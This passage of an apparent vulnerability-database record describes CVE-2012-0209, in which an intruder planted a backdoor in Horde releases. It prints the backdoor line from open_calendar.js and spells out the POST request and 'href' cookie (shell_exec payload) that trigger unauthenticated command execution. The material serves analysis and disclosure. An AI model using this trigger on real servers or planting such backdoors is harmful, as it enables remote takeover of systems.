  "cveId": "CVE-2012-0209",
  "description": "The Horde team has released a security alert concerning their products. An unknown intruder has hacked the FTP server of Horde since minimum November 02 2011 and has manipulated three Horde releases to allow unauthenticated remote PHP execution. The intruder has maintained access to the servers until February 7. The issue is currently tracked through CVE-2012-0209.",
  "vulnerabilities": [
    {
      "rootCause": "A malicious backdoor was inserted into the javascript file of Horde's open calendar, which when triggered allows remote PHP code execution.",
      "weaknesses": [
        "Backdoor inserted into javascript file.",
        "Unauthenticated remote PHP execution."
      ],
      "impact": "Remote code execution on the server.",
       "attackVectors": [
         "By sending a POST request to `/services/javascript.php` with the 'app' and 'file' parameters set, and with a crafted `href` cookie, an attacker can execute arbitrary PHP code on the server."
        ],
      "requiredCapabilities": "The attacker needs to send a specially crafted HTTP POST request to the `/services/javascript.php` script with the two variables (`app` and `file`) and the `href` cookie set to a malicious payload, without needing prior authentication.",
       "details": "The backdoor is located in the \"templates/javascript/open_calendar.js\" script:\n`link.href = '# php (isset($_COOKIE[\"href\"]) && preg_match(\"/(\.\*):(\.\*)/\\", $_COOKIE[\"href\"], $m))?$m[1]($m[2]):\"\";?>';`\nThe vulnerable script is `/services/javascript.php`. It processes POST requests and includes the javascript file `open_calendar.js`.  By setting `app` to `horde` and `file` to `open_calendar.js` and having a cookie named `href` set to `shell_exec:’uname -a’` the attacker can execute system commands."
